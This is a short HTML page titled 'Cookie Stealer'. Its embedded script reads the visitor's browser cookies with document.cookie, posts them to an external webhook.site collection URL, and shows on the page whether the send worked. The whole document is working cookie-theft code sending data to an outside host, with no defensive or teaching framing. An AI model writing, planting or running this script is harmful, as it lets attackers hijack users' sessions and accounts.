<!DOCTYPE html>
<html>
  <head><title>Cookie Stealer</title></head>
  <body>
    <h2>✅ Stealing cookie...</h2>
    <script>
      // Display something immediately
      document.body.innerHTML += "<p>Trying to send cookie...</p>";

      // Actually send the cookie
      fetch("https://webhook.site/9f55de09-3788-4b74-9f67-8c7bbc6f5626", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: document.cookie
      }).then(() => {
        // Confirm it was sent
        document.body.innerHTML += "<p>✅ Sent: " + document.cookie + "</p>";
      }).catch((err) => {
        document.body.innerHTML += "<p>❌ Error: " + err + "</p>";
      });
    </script>
  </body>
</html>
